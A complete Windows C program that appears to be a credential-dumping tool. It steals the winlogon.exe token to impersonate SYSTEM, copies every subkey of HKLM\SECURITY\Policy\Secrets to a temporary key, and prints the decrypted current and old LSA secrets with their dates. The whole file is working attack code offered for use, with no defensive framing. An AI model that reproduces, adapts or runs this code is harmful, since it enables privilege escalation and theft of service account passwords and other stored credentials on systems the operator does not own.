#ifndef UNICODE
#error Unicode environment required. Some day, I will fix, if anyone needs it.
#endif

#include <Windows.h>
#include <tchar.h>
#include <NTSecAPI.h>
#include <TlHelp32.h>
#include <Shlwapi.h> //SHCopyKey
#pragma comment(lib, "Shlwapi.lib")

#define SECRET_QUERY_VALUE 0x00000002L
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define MAX_KEY_LENGTH 255


NTSTATUS
LsaOpenSecret(
	__in LSA_HANDLE PolicyHandle,
	__in PUNICODE_STRING SecretName,
	__in ACCESS_MASK DesiredAccess,
	__out PLSA_HANDLE SecretHandle
);

NTSTATUS
LsaQuerySecret(
	__in LSA_HANDLE SecretHandle,
	__out_opt PUNICODE_STRING* CurrentValue,
	__out_opt PLARGE_INTEGER CurrentValueSetTime,
	__out_opt PUNICODE_STRING* OldValue,
	__out_opt PLARGE_INTEGER OldValueSetTime
);


BOOL reg_hklmkey_copy(LPCTSTR srcKey, LPCTSTR dstKey)
{
	BOOL bResult = FALSE;
	HKEY hkSrc;
	HKEY hkDst;
	LSTATUS Status;
	Status = RegOpenKey(HKEY_LOCAL_MACHINE, srcKey, &hkSrc);
	if (STATUS_SUCCESS == Status)
	{
		Status = RegCreateKey(HKEY_LOCAL_MACHINE, dstKey, &hkDst);
		if (STATUS_SUCCESS == Status)
		{
			Status = SHCopyKey(hkSrc, NULL, hkDst, 0);
			bResult = (STATUS_SUCCESS == Status);
			RegCloseKey(hkDst);
		}
		RegCloseKey(hkSrc);
	}
	return bResult;
}


// no length checking. No real reason to expect input longer than USHORT/2.
VOID
InitUnicodeString(
	PUNICODE_STRING DestinationString,
	PWSTR SourceString
)
{
	USHORT length;
	DestinationString->Buffer = SourceString;
	length = (USHORT)wcslen(SourceString) * sizeof(WCHAR);
	DestinationString->Length = length;
	DestinationString->MaximumLength = (USHORT)(length + sizeof(UNICODE_NULL));
}


void read_secret(TCHAR* szSecretName)
{
	LSA_UNICODE_STRING Secret;
	PLSA_UNICODE_STRING puCurrVal = NULL;
	PLSA_UNICODE_STRING puOldVal = NULL;
	NTSTATUS Status;
	LSA_HANDLE lsahLocalPolicy;
	LSA_HANDLE lsahSecretHandle;
	LSA_OBJECT_ATTRIBUTES lsaObjectAttributes;
	LARGE_INTEGER liCupdTime;
	LARGE_INTEGER liOupdTime;
	SYSTEMTIME systemtime;


	InitUnicodeString(&Secret, szSecretName);
	ZeroMemory(&lsaObjectAttributes, sizeof(lsaObjectAttributes));

	Status = LsaOpenPolicy(NULL, &lsaObjectAttributes, POLICY_ALL_ACCESS, &lsahLocalPolicy);
	if (STATUS_SUCCESS != Status)
	{
		_tprintf(_T("LsaOpenPolicy() - status: %ld\r\n"), Status);
		return;
	}

	Status = LsaOpenSecret(lsahLocalPolicy,
		&Secret,
		SECRET_QUERY_VALUE,
		&lsahSecretHandle);
	if (STATUS_SUCCESS != Status)
	{
		_tprintf(_T("LsaOpenSecret() - status: %ld\r\n"), Status);
		return;
	}

	Status = LsaQuerySecret(lsahSecretHandle,
		&puCurrVal,
		&liCupdTime,
		&puOldVal,
		&liOupdTime);
	if (STATUS_SUCCESS != Status)
	{
		_tprintf(_T("LsaQuerySecret() - status: %ld\r\n"), Status);
		return;
	}
	_tprintf(_T("Current secret: %s\r\n"), puCurrVal->Buffer);
	FileTimeToSystemTime(&liCupdTime, &systemtime);
	_tprintf(_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
	_tprintf(_T("    Old secret: %s\r\n"), puOldVal->Buffer);
	FileTimeToSystemTime(&liOupdTime, &systemtime);
	_tprintf(_T("          DATE: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);
	LsaClose(lsahSecretHandle);
	LsaClose(lsahLocalPolicy);
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		_tprintf(_T("[-] LookupPrivilegeValue error: %u\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		_tprintf(_T("[-] AdjustTokenPrivileges error: %u\n"), GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(_T("[-] The token does not have the specified privilege. %u\n"), GetLastError());
		return FALSE;
	}
	return TRUE;
}


DWORD getWinLogonPID()
{
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (TRUE == Process32FirstW(snapshot, &entry))
	{
		while (TRUE == Process32NextW(snapshot, &entry))
		{
			if (0 == wcscmp(entry.szExeFile, L"winlogon.exe"))
			{
				_tprintf(_T("Winlogon PID Found %d\n"), entry.th32ProcessID);
				return entry.th32ProcessID;
			}
		}
	}
	return 0;
}


BOOL elevateSystem()
{
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken;
	getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!getCurrentToken)
	{
		_tprintf(_T("OpenProcessToken() Error  %u\n"), GetLastError());
		return FALSE;
	}
	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME))
	{
		_tprintf(_T("SetPrivilege() Enable Error  %u\n"), GetLastError());
		return FALSE;
	}
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	DWORD pidToImpersonate;
	pidToImpersonate = getWinLogonPID();
	if (0 == pidToImpersonate)
	{
		_tprintf(_T("PID of winlogon not found\n"));
		return FALSE;
	}
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
	if (NULL == processHandle)
	{
		_tprintf(_T("OpenProcess Error %u\n"), GetLastError());
		return FALSE;
	}
	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle))
	{
		_tprintf(_T("OpenProcessToken Error %u\n"), GetLastError());
		CloseHandle(processHandle);
		return FALSE;
	}
	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;
	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
	{
		_tprintf(_T("DuplicateTokenEx Error %u\n"), GetLastError());
		CloseHandle(processHandle);
		CloseHandle(tokenHandle);
		return FALSE;
	}
	if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
	{
		_tprintf(_T("Impersonate Logged On User Error %u\n"), GetLastError());
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		CloseHandle(processHandle);
		return FALSE;
	}
	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	CloseHandle(processHandle);
	return TRUE;
}


TCHAR* pszSecretsSubkeyPath = _T("SECURITY\\Policy\\Secrets");
TCHAR* pszTestKeyPath = _T("SECURITY\\Policy\\Secrets\\__GT__Decrypt");
TCHAR* pszTestKeyName = _T("__GT__Decrypt");


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	HKEY hTestKey;
	TCHAR* pszTestedSecretFullKeyPath;
	DWORD dwKeyNameSize; // size of name string 
	DWORD dwSubKeyCount = 0; // number of subkeys 
	FILETIME ftLastWriteTime; // last write time 
	LSTATUS Status;
	SYSTEMTIME systemtime;

	pszTestedSecretFullKeyPath = LocalAlloc(LPTR, MAX_PATH * sizeof(TCHAR));
	if (NULL == pszTestedSecretFullKeyPath)
	{
		return -1;
	}

	Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		pszSecretsSubkeyPath,
		0,
		KEY_READ,
		&hTestKey);

	if (ERROR_SUCCESS != Status)
	{
		_tprintf(_T("\r\nCannot open HKLM\\%s.\r\nTrying to impersonate as NT AUTHORITY\\SYSTEM...\r\n"), pszSecretsSubkeyPath);
		if (!elevateSystem())
		{
			_tprintf(_T("\r\nCannot elevate. Try to re-launch the tool as Admin or NT AUTHORITY\\SYSTEM\r\n"));
			return -2;
		}

		//should be elevated here, let's open again
		Status = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
			pszSecretsSubkeyPath,
			0,
			KEY_READ,
			&hTestKey);

		if (ERROR_SUCCESS != Status)
		{
			_tprintf(_T("\r\nStill cannot open HKLM\\%s.\r\nExiting...\r\n"), pszSecretsSubkeyPath);
			return -3;
		}
	}


	DWORD retCode;
	// Get the value count. 
	retCode = RegQueryInfoKey(
		hTestKey,
		NULL,
		NULL,
		NULL,
		&dwSubKeyCount,
		&dwKeyNameSize,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);

	if ((ERROR_SUCCESS != retCode) || (0 == dwSubKeyCount) || (MAX_KEY_LENGTH < dwKeyNameSize))
	{
		return -1;
	}

	// Enumerate subkeys
	_tprintf(_T("\r\nNumber of subkeys: %d\r\n\r\n"), dwSubKeyCount);

	DWORD i;
	for (i = 0; i < dwSubKeyCount; i++)
	{
		TCHAR szKey[MAX_KEY_LENGTH];
		dwKeyNameSize = MAX_KEY_LENGTH;
		retCode = RegEnumKeyEx(hTestKey, i,
			szKey,
			&dwKeyNameSize,
			NULL,
			NULL,
			NULL,
			&ftLastWriteTime);
		if (retCode == ERROR_SUCCESS)
		{
			_tprintf(TEXT("(%d) %s\n"), i + 1, szKey);
			//no error checking for _tcscat_s. in the worst case reg_hklmkey_copy will return false, which we can afford
			_tcscat_s(pszTestedSecretFullKeyPath, LocalSize(pszTestedSecretFullKeyPath), pszSecretsSubkeyPath);
			_tcscat_s(pszTestedSecretFullKeyPath, LocalSize(pszTestedSecretFullKeyPath), _T("\\"));
			_tcscat_s(pszTestedSecretFullKeyPath, LocalSize(pszTestedSecretFullKeyPath), szKey);

			_tprintf(_T("--> %s\r\n"), pszTestedSecretFullKeyPath);
			FileTimeToSystemTime(&ftLastWriteTime, &systemtime);
			_tprintf(_T("Last Write Time: %i-%02i-%02i %02i:%02i \r\n"), systemtime.wYear, systemtime.wMonth, systemtime.wDay, systemtime.wHour, systemtime.wMinute);

			if (reg_hklmkey_copy(pszTestedSecretFullKeyPath, pszTestKeyPath))
			{
				read_secret(pszTestKeyName);
				RegDeleteTree(HKEY_LOCAL_MACHINE, pszTestKeyPath);
			}
			else
			{
				_tprintf(_T("ERROR! Cannot duplicate %s\r\n"), pszTestedSecretFullKeyPath);
			}
			memset(pszTestedSecretFullKeyPath, 0, LocalSize(pszTestedSecretFullKeyPath));
			_tprintf(_T("\r\n"));
		}
		else
		{
			_tprintf(TEXT("Error calling RegEnumKeyEx() for subkey %d\r\n"), i + 1);
		}
	}

	RegCloseKey(hTestKey);
	LocalFree(pszTestedSecretFullKeyPath);
	RevertToSelf();
	return 0;
}
